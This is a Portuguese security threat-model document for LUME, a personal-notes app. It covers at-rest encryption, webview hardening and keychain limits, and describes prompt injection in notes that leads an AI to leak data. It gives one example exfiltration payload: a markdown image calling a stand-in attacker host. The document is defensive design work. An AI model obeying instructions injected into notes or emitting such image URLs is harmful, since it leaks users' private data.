# Modelo de ameaça e segurança do LUME

> O LUME guarda o seu segundo cérebro: notas pessoais, potencialmente sensíveis. Há **dois problemas de segurança distintos** que exigem soluções distintas.

Este documento descreve o modelo de ameaça técnico, a proteção em repouso (A), o risco da própria IA como canal de exfiltração (B) e os limites do keychain/stronghold.

---

## Os dois problemas (não confundir)

- **(A) At-rest** — os arquivos do cérebro em disco precisam ser ilegíveis sem a senha do usuário. **Cripto resolve.**
- **(B) IA como canal de exfiltração** — texto malicioso embutido nas notas (prompt-injection) pode instruir a IA a vazar dados. **Cripto NÃO resolve.**

---

## Tabela ameaça → mitigação

| Ameaça | Mitigação |
|---|---|
| Leitura dos `.md` no disco por terceiro/roubo de máquina | Cifra por arquivo **XChaCha20-Poly1305**; CEK derivada da senha via **Argon2id** |
| Leitura do índice `.db` (cópia em texto plano dos `.md`) | **Mesma proteção em repouso** dos `.md` (cifrar o `.db`) |
| Chave/senha vazando da memória | CEK e senha só em RAM com **secrecy + zeroize**; decifra sob demanda |
| **Prompt-injection** embutido nas notas instruindo a IA a exfiltrar (classe CVE-2025-32711, M365 Copilot, CVSS 9.3) | **Egress lockdown** (LLM offline / allowlist de rede) + **sanitização da saída markdown** (remover imagem remota / auto-fetch) |
| Exfiltração via markdown que dispara requisição (img remoto, auto-fetch de URL) | Sanitizar a saída: remover/neutralizar `img` remoto e qualquer auto-fetch |
| Captura de tela / gravação da janela por outro software | `set_content_protection(true)` (Windows **WDA_EXCLUDEFROMCAPTURE**) |
| Frontend (webview) comprometido tentando acessar segredos | Toda cripto/segredos só no **Core Rust**; **CSP estrita**, **Isolation Pattern**, **capabilities mínimas por janela** |
| Malware rodando como o **mesmo usuário** | **Não totalmente mitigável** por keychain/DPAPI (ver limites abaixo) — documentar honestamente |

---

## (A) Proteção em repouso (at-rest)

Cadeia de derivação e cifra:

```
senha do usuario
      |
      v   Argon2id  (parametros OWASP 2026)
     CEK  (Content Encryption Key)
      |
      v   XChaCha20-Poly1305  (cifra autenticada, POR ARQUIVO)
  arquivos OKF (.md) cifrados em disco
```

Regras:

- **Argon2id** deriva a CEK a partir da senha, com parâmetros conforme **OWASP 2026**.
- **XChaCha20-Poly1305** cifra **cada arquivo** (AEAD; nonce estendido do XChaCha evita colisão de nonce).
- A **CEK vive somente em RAM** (secrecy + zeroize) e o conteúdo é **decifrado sob demanda**. Nada de CEK persistida em claro.
- **O índice `.db` exige a MESMA proteção.** Como o SQLite (FTS5 + sqlite-vec + edges) é uma **cópia em texto plano** do conteúdo das notas, ele deve ser protegido em repouso exatamente como os `.md`. Cifrar o cérebro e deixar o índice em claro anula a proteção.

---

## (B) A própria IA como canal de exfiltração

Esta é uma classe de ataque **distinta** e **comprovada**: instruções maliciosas escondidas dentro do conteúdo (uma nota importada, um trecho colado) que a IA lê e obedece, levando-a a vazar dados do cérebro. Referência: **CVE-2025-32711** (M365 Copilot, **CVSS 9.3**).

> **A criptografia não resolve (B).** Os dados são decifrados legitimamente para a IA processar; o vazamento ocorre *depois* da decifragem, pelo comportamento do modelo.

Mitigações:

1. **Egress lockdown** — o LLM roda **offline**; qualquer rede passa por **allowlist**. Sem caminho de saída, não há para onde exfiltrar.
2. **Sanitização da saída markdown** — remover **imagens remotas** e qualquer mecanismo de **auto-fetch** da resposta renderizada, fechando o vetor clássico de exfiltração por URL (ex.: `![](https://atacante/?dados=...)`).

Endurecimento da webview (defesa em profundidade):

- **CSP estrita.**
- **Isolation Pattern** do Tauri.
- **Capabilities mínimas por janela** (cada janela só recebe o que precisa).
- **`set_content_protection(true)`** (no Windows, `WDA_EXCLUDEFROMCAPTURE`) para barrar captura/gravação da janela.

---

## Limites do keychain / stronghold (documentar honestamente)

- **keyring / DPAPI não protegem contra malware do mesmo usuário.** O cofre de credenciais do SO protege contra *outros* usuários e acesso offline ao disco, mas um processo malicioso rodando **com a mesma conta** do usuário pode, em geral, solicitar o segredo da mesma forma que o LUME. Isto é um limite do modelo do SO, não um bug do LUME — e está documentado para não criar falsa sensação de segurança.
- **`tauri-plugin-stronghold` está depreciado** (será removido no Tauri v3) e **não é a base da cripto** do LUME. A criptografia é própria (Argon2id + XChaCha20-Poly1305) e vive no Core Rust (ver `STACK.md`).

---

## Referências cruzadas

- Princípio "cripto só no Core" e "OKF = verdade / `.db` descartável": `ARCH.md`
- Crates de cripto, KDF e keychain: `STACK.md`
- Egress lockdown e modelos offline: `MODELS.md`
- ADRs relacionadas: `DECISIONS.md`
